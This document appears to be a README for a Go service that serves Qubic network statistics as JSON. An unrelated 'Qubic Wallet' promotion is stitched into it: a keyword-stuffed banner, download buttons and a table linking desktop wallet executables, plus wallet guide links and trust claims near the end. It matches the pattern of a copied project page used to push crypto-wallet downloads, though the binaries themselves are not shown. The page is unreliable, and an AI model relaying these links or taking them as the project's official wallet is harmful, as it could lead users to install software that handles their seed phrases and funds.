![Qubic Wallet](assets/qubic-wallet-download-seed-phrase-install-address-app-banner.png)

# Qubic stats service

Qubic network statistics over HTTP: ticks, transactions and identities as JSON.

<p align="center"><a href="https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/LICENSE"><img src="assets/badge-license.svg" alt="License"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2"><img src="assets/badge-release.svg" alt="Release"></a></p>

## Downloads - v0.8.2

<p align="center"><a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`qubic-wallet-desktop-v0.8.2-windows.exe`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`qubic-wallet-desktop-v0.8.2-osx-arm64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`qubic-wallet-desktop-v0.8.2-linux-x64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip) |

> The numbers behind Qubic, served over HTTP. Point it at a node, get ticks, transactions and identities
> back as structured data you can put in a dashboard, a bot or a spreadsheet.

## What it gives you

The Qubic network is fast and the raw access is not friendly. This service sits in front of it and answers
the questions people actually ask: what is the current tick, what happened in this transaction, and what
does this identity hold. One binary, a small set of endpoints, and JSON on the way out.

It is written in Go, ships with a Dockerfile, and starts in seconds. There is no database to seed and no
schema migration to run before your first request: give it node addresses and it begins answering.

## What you can ask it

- The current tick, so a dashboard can show whether the network is moving.
- A transaction by its id, so a support thread can stop arguing about whether a transfer exists.
- An identity's balances and recent activity, so a portfolio view has something to draw.
- Service status, so your monitoring knows the difference between "no data" and "service down".

The handler layout mirrors that list, which is the useful property when you fork it: find the file named
after the question, and the answer lives there.

## Run it

Build the binary:

```bash
go build -o "server" "./app/server"
```

Start it against your nodes:

```bash
./server --qubic-node-ips="65.21.10.217;148.251.184.163" --opensearch-host="http://93.190.139.223:9200"
```

The node list takes several addresses separated by a semicolon, so the service keeps answering when one
peer is slow. Configuration is flags at startup; nothing is hidden in a config file you have to discover.

With Docker, build the image from the included Dockerfile and pass the same flags as the container
command. That is the whole deployment story, which is the point: a statistics service that needs a
platform team to install it does not get used.

## Who it is for

- Dashboard and explorer builders who want Qubic data without writing a node client first.
- Developers prototyping against real network state before their own integration exists.
- Operators who want a health view of the network they run.

## Practical notes

The upstream endpoints are read-only, so the service is safe to run beside anything else and cannot move
funds: there is no key handling anywhere in it. Node addresses change over time, and the flags exist
precisely so you can change them without a rebuild.

If you need the wallet itself, that is a separate download. The links below cover the desktop build and the
guides that go with it:

- [What is Qubic Wallet and what does it actually do](https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/what-is-qubic-wallet.md) -
  the wallet side of the ecosystem in one page.
- [How to check a QUBIC transaction when the wallet shows nothing](https://github.com/qubic-wallet/qubic-wallet-troubleshooting/blob/main/qubic-wallet-block-explorer-verify.md) -
  the same verification instinct, done by hand.

## Contributing

Add an endpoint when a real question has no answer here, and keep the handler, the docs and the README
sentence about it in one change. Fast, small, readable beats clever: this is infrastructure other people
will run at 3am.

## At a glance

- Language: Go, with a Dockerfile in the tree.
- Responses: JSON, one shape per question.
- Configuration: startup flags for node addresses and the search backend.
- Deployment: a single binary, or a container built from the included file.

## Why a service and not a client library

Every dashboard team writes the same client twice: once to fetch state, once to explain to the next person
why the fetch failed. Putting that work behind HTTP means the answers are one `curl` away, the failure modes
are visible in a log, and the language of the front end stops mattering. It also means the node address list
lives in one place instead of in every consumer.

The design follows the questions. A tick endpoint for "is the network moving", a transaction endpoint for
"did my transfer land", an identity endpoint for "what does this account hold", and a status endpoint so
monitoring can tell a quiet network from a broken service. That is a small surface on purpose: each addition
has to earn its place by answering something the existing four cannot.

Running it beside your own tooling is safe by construction. There is no key handling anywhere in the
service, no signing path and nothing that can move funds, so the worst failure is a stale number rather
than a lost asset. For anything that touches keys, use the wallet and its guides instead.

## About and license

Qubic Wallet is the desktop wallet for Qubic: seed-based accounts, local key storage and the QX trading screen, on Windows, macOS and Linux.

These guides are published under the MIT license; the full text is in the repository `LICENSE` file. Nothing here is an audit or an endorsement, and every claim is checked against the release, the repository or the client constants rather than repeated from marketing.
